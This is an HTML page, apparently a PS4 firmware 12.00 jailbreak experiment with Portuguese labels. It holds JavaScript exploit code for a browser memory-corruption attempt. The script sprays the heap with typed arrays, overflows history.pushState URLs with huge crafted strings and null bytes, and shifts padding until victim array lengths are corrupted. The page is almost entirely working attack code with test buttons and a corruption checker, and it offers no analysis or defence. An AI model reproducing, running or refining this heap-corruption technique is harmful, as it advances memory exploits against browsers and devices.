<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 PWN (Alignment Shifter)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        button { padding: 15px; font-size: 1.2em; background: #111; color: #fff; border: 1px solid #0f0; margin: 10px 0; width: 100%; cursor: pointer; }
        button:hover { background: #222; }
        input { background: #333; color: #fff; border: 1px solid #555; padding: 10px; font-size: 1.2em; width: 100px; text-align: center; }
        .group { border: 1px solid #444; padding: 15px; margin-bottom: 20px; }
        .win { background-color: #440; color: #ff0; border: 2px solid #ff0; padding: 5px; }
    </style>
</head>
<body>

<h1>REPLICA 100% + SINTONIA FINA</h1>
<p>Estratégia: Deslocar a memória para acertar o Length em vez do ID.</p>

<div class="group">
    <label style="font-size: 1.2em;">PADDING (Deslocamento):</label>
    <input type="number" id="padInput" value="0" min="0" max="64" step="4">
    <p>Tente: 0, 4, 8, 12, 16, 24, 32 (Reinicie a página a cada tentativa)</p>
</div>

<h3>1. TESTE 6 (Incremental)</h3>
<label>Start:</label> <input type="number" id="t6start" value="1000">
<label>Step:</label> <input type="number" id="t6step" value="5000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<h3>2. TESTE 3 (Padrões)</h3>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h3>3. TESTE 1 (Gatilho + Injeção)</h3>
<p style="color:red">CLIQUE EM CANCELAR NA MENSAGEM DE MEMÓRIA.</p>
<button onclick="test1_Run()" style="border-color:red; color:red">Executar Teste 1</button>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;
let heapObjects = [];
let targetObjects = [];

function log(msg, type='') {
    const el = document.getElementById('log');
    const color = type === 'win' ? 'yellow' : '#0f0';
    el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function prepareHeap() {
    log('Preparando heap...');
    heapObjects = [];
    targetObjects = [];
    
    // Spray genérico
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    // Buracos
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    // Alvos (Vítimas Uint32Array - Voltamos para eles pois são melhores de detectar)
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            view: view
        });
    }
    log('Heap preparado.');
}

function checkCorruption() {
    let corruptionFound = false;
    for (let i = 0; i < Math.min(50, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            
            // Tenta ler propriedades
            let len = t.view.length;
            let val = t.view[0];

            // Se o tamanho não for 256, BINGO.
            if (len !== 256) {
                log(`!!! JACKPOT !!! Alvo ${i} LENGTH MODIFICADO: ${len}`, 'win');
                document.body.style.backgroundColor = "#004400";
                alert(`ALINHAMENTO CORRETO!\nPadding usado: ${document.getElementById('padInput').value}\nLength: ${len}`);
                corruptionFound = true;
                return true;
            }
            
            if (val !== 0xDEADBEEF) {
                log(`!!! JACKPOT !!! Alvo ${i} CONTEÚDO MUDOU: 0x${val.toString(16)}`, 'win');
                corruptionFound = true;
                return true;
            }

        } catch (e) {
            // Se o objeto morreu, é um sinal de "Quase lá"
            if (e.message.includes("undefined") || e.message.includes("null")) {
                log(`[Alvo ${i}] Objeto DESTRUÍDO (Acertou o ID). Tente mudar o Padding!`, 'win');
                corruptionFound = true;
            }
        }
    }
    
    if (!corruptionFound) {
        log("Verificação concluída. Nenhuma alteração detectada com este Padding.");
    }
    return false;
}

// === TESTE 6 (INTOCADO) ===
async function test6_Incremental() {
    log('=== TESTE 6 ===');
    prepareHeap();
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    let currentSize = start;
    for (let i = 0; i < 10; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) overflow += String.fromCharCode(j % 33);
            history.pushState({}, `inc_${currentSize}`, "/" + base + overflow);
            currentSize += step;
            await new Promise(r => setTimeout(r, 1500)); 
        } catch (e) { break; }
    }
    log("Teste 6 OK.");
}

// === TESTE 3 (INTOCADO) ===
async function test3_SpecialSequences() {
    log('=== TESTE 3 ===');
    prepareHeap(); 
    const sequences = [
        { bytes: "\x00\x00\x00\x00" }, { bytes: "\x0A\x0A\x0A\x0A" }, 
        { bytes: "\x09\x09\x09\x09" }, { bytes: "\x0D\x0D\x0D\x0D" }, 
        { bytes: "\x20\x20\x20\x20" }, { bytes: "\x00\x09\x0A\x0D\x20" }
    ];
    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) overflow += seq.bytes;
            history.pushState({}, "pattern", "/" + base + overflow);
            await new Promise(r => setTimeout(r, 100)); 
        } catch (e) {}
    }
    log("Teste 3 OK.");
}

// === TESTE 1 + PADDING ===
async function test1_Run() {
    let padding = parseInt(document.getElementById('padInput').value);
    log(`=== TESTE 1: INICIANDO COM PADDING ${padding} ===`);
    
    // 1. APLICAR O DESLOCAMENTO (PADDING)
    // Inserimos uma string inútil apenas para empurrar a memória
    if (padding > 0) {
        try {
            let padStr = "P".repeat(padding);
            history.pushState({}, "padding_shift", "/A" + padStr);
            log(`Memória deslocada em ${padding} bytes.`);
        } catch(e) {}
    }

    // 2. VÍTIMAS FRESCAS (Uint32Array - Voltamos pra eles, são melhores)
    for(let k=0; k<50; k++) {
        let v = new Uint32Array(256);
        v.fill(0xDEADBEEF);
        targetObjects.unshift(v); 
    }

    // 3. LOOP DE ESTRESSE
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100); 
            const payload = "/" + base + overflow;
            history.pushState({}, `test_${byte}`, payload);
            if (byte % 32 === 0) await new Promise(r => setTimeout(r, 10)); 
        } catch (e) {
            log(`OOM em 0x${byte.toString(16)}...`);
        }
    }
    
    // 4. INJEÇÃO FINAL (ZEROS)
    log(`INJETANDO 29 BYTES (ZEROS)...`);
    
    try {
        const base = "A".repeat(BASE_SAFE);
        const attack = "\x00".repeat(29); 
        
        history.replaceState({}, "PWN_FINAL", "/" + base + attack);
        
        log(">>> INJEÇÃO FEITA. VERIFICANDO... <<<", 'win');
        checkCorruption();
        
    } catch(ex) {
        log("Falha na injeção final: " + ex.message);
    }
}
</script>
</body>
</html>
